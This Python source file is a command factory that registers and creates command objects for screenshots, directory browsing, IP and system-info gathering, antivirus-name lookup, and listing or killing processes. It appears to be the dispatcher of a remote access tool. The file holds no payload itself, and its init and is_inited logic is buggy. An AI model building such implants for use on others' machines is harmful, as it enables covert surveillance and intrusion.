"""
Command Factory
"""


from command.command import CommandBase
from command.command_ls import CommandLS
from command.command_pwd import CommandPWD
from command.command_cd import CommandCD
from command.command_screenshot import CommandScreenShot
from command.command_get_ip import CommandGetIp
from command.command_list_drives import CommandListDrives
from command.command_list_programs import CommandListPrograms
from command.command_get_av_name import CommandGetAVName
from command.command_get_sys_info import CommandGetSysInfo
from command.command_kill_process import CommandKillProcess
from command.command_list_process import CommandListProcess


class CommandFactory:
    _commands = []
    _inited = False

    def is_inited(self):
        return _inited

    @classmethod
    def init(cls):
        if cls._inited:
            return True

        # Register commands
        cls._commands.append("ls")
        cls._commands.append("pwd")
        cls._commands.append("cd")
        cls._commands.append("screenshot")
        cls._commands.append("get_ip")
        cls._commands.append("list_drives")
        cls._commands.append("list_programs")
        cls._commands.append("get_av_name")
        cls._commands.append("get_sys_info")
        cls._commands.append("kill_process")
        cls._commands.append("list_process")

        return True

    @classmethod
    def cleanup(cls):
        cls._commands.clear()

    @classmethod
    def get_command_names(cls):
        return cls._commands

    @classmethod
    def create(cls, name) -> CommandBase:
        if name in cls._commands:
            if name == "ls":
                return CommandLS()
            elif name == "pwd":
                return CommandPWD()
            elif name == "cd":
                return CommandCD()
            elif name == "screenshot":
                return CommandScreenShot()
            elif name == "get_ip":
                return CommandGetIp()
            elif name == "list_drives":
                return CommandListDrives()
            elif name == "list_programs":
                return CommandListPrograms()
            elif name == "get_av_name":
                return CommandGetAVName()
            elif name == "get_sys_info":
                return CommandGetSysInfo()
            elif name == "kill_process":
                return CommandKillProcess()
            elif name == "list_process":
                return CommandListProcess()
